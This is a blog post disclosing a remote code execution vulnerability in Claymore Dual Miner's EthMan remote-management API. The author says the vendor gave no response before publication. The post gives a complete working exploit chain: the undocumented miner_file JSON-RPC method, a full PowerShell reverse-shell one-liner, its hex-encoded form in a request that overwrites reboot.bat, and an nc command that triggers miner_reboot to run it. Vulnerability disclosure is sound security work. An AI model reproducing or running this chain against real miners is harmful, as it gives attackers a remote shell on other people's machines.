---
layout: post
title: Claymore Dual Miner Remote Code Execution
---

Hello everybody, today I will show you how I found a Remote Code Execution vulnerability on popular Claymore Dual Miner developed by nanopool which you can download from GitHub here.

Before continuing to read I want to clarify that I already emailed nanopool without receiving any kind or response, so I’m publicly disclosure this vulnerability waiting for a CVE assignment. Let’s go!

Starting from version 7.3 the developers introduced a remote manager tool called EthMan which allows to control the miner remotely sending JSON API strings to a specific port set during the configuration phase. This is how the miner can be started to mine Ethereum:

```
EthDcrMiner64.exe -epool eth-eu.dwarfpool.com:8008 -ewal 0x83718eb67761Cf59E116B92A8F5B6CFE28A186E2 -epsw x -esm 0 -asm 0 -mode 1 -mport 5555
```

Without go through the explanation of every single parameter, look at -mport one, which is the most interesting one for the vulnerability that I discovered; it opens the port 5555 waiting for incoming connection from the remote manager tool. That’s how EthMan looks like:

<amp-img width="600" height="400" layout="responsive" src="/assets/images/Screenshot_1.png"></amp-img>

After adding my local running miner into the list using 127.0.0.1 as IP and 5555 as port I could read the statistics of it like Mh/s, GPU temperatures, etc… Also I looked at the context menu and I immediately noticed “Execute reboot.bat” function, so I started to read the API documentation attached with the tool:

> EthMan uses raw TCP/IP connections (not HTTP) for remote management and statistics. Optionally, "psw" field is added to requests is the password for remote management is set for miner.

I went deeper and I collected some useful JSON strings:

```
REQUEST:

{"id":0,"jsonrpc":"2.0","method":"miner_restart"}

RESPONSE:
none.

COMMENTS:
Restarts miner.


REQUEST:
{"id":0,"jsonrpc":"2.0","method":"miner_reboot"}

RESPONSE:
none.

COMMENTS:
Calls "reboot.bat" for Windows, or "reboot.bash" (or "reboot.sh") for Linux.
```

With these two JSON string I can restart my miner or execute a reboot.bat file which is included in the same directory of the miner.
Another interesting remote manager function is “Edit config.txt” which allows to upload a new config.txt file but there is no documentation about the API which allows to upload the configuration files, so I fired up my Wireshark and I started to capture the packets. Finally I discovered the API which reads and sends the configuration files:

```
{"id":0,"jsonrpc":"2.0","method":"miner_getfile","params":["config.txt"]}

{"id":0,"jsonrpc":"2.0","method":"miner_file","params":["config.txt","HEX_ENCODED_STRING"]}
```

Basically the first one requests a file and will receives a response with the content encoded in hexadecimal, the second one uploads a new file, both of them allow to read and write only files inside the miner’s folder. I decided to check if I could upload and overwrite the reboot.bat file, so I prepared a one line reverse shell in PowerShell:

```
powershell.exe -Command "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Then I encoded the string in hexadecimal and I forged the JSON API string:

```
{"id":0,"jsonrpc":"2.0","method":"miner_file","params":["reboot.bat", "706f7765727368656c6c2e657865202d436f6d6d616e64202224636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e536f636b6574732e544350436c69656e7428273132372e302e302e31272c31323334293b2473747265616d203d2024636c69656e742e47657453747265616d28293b5b627974655b5d5d246279746573203d20302e2e36353533357c257b307d3b7768696c6528282469203d202473747265616d2e52656164282462797465732c20302c202462797465732e4c656e6774682929202d6e652030297b3b2464617461203d20284e65772d4f626a656374202d547970654e616d652053797374656d2e546578742e4153434949456e636f64696e67292e476574537472696e67282462797465732c302c202469293b2473656e646261636b203d202869657820246461746120323e2631207c204f75742d537472696e6720293b2473656e646261636b3220203d202473656e646261636b202b202750532027202b2028707764292e50617468202b20273e20273b2473656e6462797465203d20285b746578742e656e636f64696e675d3a3a4153434949292e4765744279746573282473656e646261636b32293b2473747265616d2e5772697465282473656e64627974652c302c2473656e64627974652e4c656e677468293b2473747265616d2e466c75736828297d3b24636c69656e742e436c6f7365282922"]}
```

Then I started to listen locally on port 1234 and I sent the reboot API string:

```
echo -e '{"id":0,"jsonrpc":"2.0","method":"miner_reboot"}\n' | nc 127.0.0.1 5555 && echo
```

Surprise!

<amp-img width="600" height="300" layout="responsive" src="/assets/images/Screenshot_2.png"></amp-img>